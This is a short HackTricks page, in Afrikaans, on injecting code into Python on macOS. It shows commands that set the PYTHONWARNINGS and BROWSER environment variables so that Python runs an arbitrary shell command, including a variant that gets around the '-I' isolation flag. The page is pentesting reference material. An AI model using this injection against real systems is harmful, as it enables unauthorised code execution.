# macOS Python Toepassings Inspuiting

{{#include ../../../banners/hacktricks-training.md}}

## Deur `PYTHONWARNINGS` en `BROWSER` omgewingsveranderlikes

Dit is moontlik om beide omgewingsveranderlikes te verander om arbitrêre kode uit te voer wanneer python aangeroep word, byvoorbeeld:
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
{{#include ../../../banners/hacktricks-training.md}}
